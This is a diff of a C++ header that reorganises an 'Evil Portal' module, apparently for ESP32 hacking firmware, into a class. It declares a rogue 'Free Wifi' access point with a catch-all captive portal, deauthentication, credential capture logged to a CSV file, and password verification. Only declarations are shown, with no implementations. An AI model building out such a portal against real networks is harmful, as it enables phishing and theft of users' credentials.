@@ -1,28 +1,84 @@
-#include <WiFi.h>
+#ifndef __EVIL_PORTAL_H__
+#define __EVIL_PORTAL_H__
+
 #include <DNSServer.h>
-#include <WebServer.h>
-#include <SD.h>
-#include <SPI.h>
+#include <ESPAsyncWebServer.h>
+#include <globals.h>
 
-// function defaults
+class EvilPortal {
+    class CaptiveRequestHandler : public AsyncWebHandler {
+    public:
+        CaptiveRequestHandler(EvilPortal *portal) : _portal(portal) {}
+        virtual ~CaptiveRequestHandler() { _portal = nullptr; }
+        bool canHandle(AsyncWebServerRequest *request) {
+            return true;
+        }; // request->addInterestingHeader("ANY");
+        void handleRequest(AsyncWebServerRequest *request);
 
-void startEvilPortal(String tssid = "", uint8_t channel = 6, bool deauth = false);
+    private:
+        EvilPortal *_portal;
+    };
 
-void chooseHtml(bool def = true);
+public:
+    /////////////////////////////////////////////////////////////////////////////////////
+    // Constructor
+    /////////////////////////////////////////////////////////////////////////////////////
+    EvilPortal(String tssid = "", uint8_t channel = 6, bool deauth = false, bool verifyPwd = false);
+    ~EvilPortal();
 
-String getDefaultHtml();
+    /////////////////////////////////////////////////////////////////////////////////////
+    // Operations
+    /////////////////////////////////////////////////////////////////////////////////////
+    bool setup(void);
+    void beginAP(void);
+    void setupRoutes(void);
+    void loop(void);
 
-String getHtmlContents(String body);
+private:
+    String apName = "Free Wifi";
+    uint8_t _channel;
+    bool _deauth;
+    bool isDeauthHeld = false;
+    bool _verifyPwd; // From PR branch
+    AsyncWebServer webServer;
 
-String creds_GET();
+    DNSServer dnsServer;
+    IPAddress apGateway;
 
-String index_GET();
+    String outputFile = "default_creds.csv";
 
-String clear_GET();
+    String htmlPage;
+    String htmlFileName;
+    bool isDefaultHtml = true;
+    FS *fsHtmlFile;
 
-String ssid_GET();
+    String lastCred;
+    int totalCapturedCredentials = 0;
+    int previousTotalCapturedCredentials = -1;
+    String capturedCredentialsHtml = "";
+    bool verifyPass = false;
 
-String ssid_POST();
+    void portalController(AsyncWebServerRequest *request);
+    void credsController(AsyncWebServerRequest *request);
 
-void saveToCSV(const String &filename, const String &csvLine);
+    bool verifyCreds(String &Ssid, String &Password);
+    void restartWiFi(bool reset = true);
+    void resetCapturedCredentials(void);
+    void printDeauthStatus(void);
+    void printLastCapturedCredential(void);
+    void loadCustomHtml(void);
+    void loadDefaultHtml(void);
+    void loadDefaultHtml_one(void);
+    String wifiLoadPage(void);
+    void saveToCSV(const String &csvLine, bool IsAPname = false);
+    void drawScreen(void);
 
+    String getHtmlTemplate(String body);
+    String creds_GET(void);
+    String ssid_GET(void);
+    String ssid_POST(void);
+
+    void apName_from_keyboard(void);
+};
+
+#endif
